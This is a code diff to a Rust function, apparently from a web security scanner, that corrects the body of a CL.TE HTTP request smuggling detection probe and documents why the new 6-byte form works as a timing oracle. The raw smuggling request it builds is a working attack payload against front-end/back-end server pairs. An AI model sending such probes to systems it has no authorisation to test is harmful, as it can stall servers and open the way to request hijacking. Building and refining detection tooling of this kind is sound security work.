@@ -460,9 +460,34 @@ pub fn pipeline_builder(
 }
 
 /// Safe detection probe for CL.TE (causes back-end hang without socket poisoning).
+///
+/// Body shape is the canonical Portswigger CL.TE timing oracle:
+///
+/// ```text
+/// 0\r\n
+/// \r\n
+/// X
+/// ```
+///
+/// That's exactly 6 bytes (`0`, `\r`, `\n`, `\r`, `\n`, `X`).
+/// Pre-fix this used `0\r\nX\r\n\r\n` — 8 bytes with data AFTER the
+/// final chunk terminator. RFC 7230 §4.1 says trailers may follow
+/// `0\r\n` but only as `name: value\r\n*` then `\r\n` — a bare
+/// byte like `X` makes the body invalid chunked encoding. Strict
+/// parsers (Apache, recent nginx, Envoy) return 400 instead of
+/// hanging, defeating the timing oracle. The canonical form keeps
+/// the body valid for both interpretations:
+///
+/// - CL-following frontend (CL=6) reads all 6 bytes and forwards.
+/// - TE-following backend reads `0\r\n` (chunk-size 0 = end),
+///   then `\r\n` (trailer-section terminator), leaving the `X`
+///   in the connection buffer to prepend the next request.
+///
+/// Result: the backend hangs waiting for the next request (or
+/// pipelines a corrupted one); the frontend is satisfied; CL ≠
+/// TE confirmed via the latency delta.
 pub fn detect_cl_te(host: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = sanitize_input(host)?;
-    // Short CL covering only part of the chunked body → back-end hangs waiting for rest
     let raw = format!(
         "POST / HTTP/1.1\r\n\
          Host: {host}\r\n\
@@ -470,7 +495,8 @@ pub fn detect_cl_te(host: &str) -> Result<SmugglingPayload, crate::safety::Safet
          Transfer-Encoding: chunked\r\n\
          \r\n\
          0\r\n\
-         X\r\n\r\n"
+         \r\n\
+         X"
     );
     Ok(SmugglingPayload {
         description: "Detect CL.TE (timing)".into(),
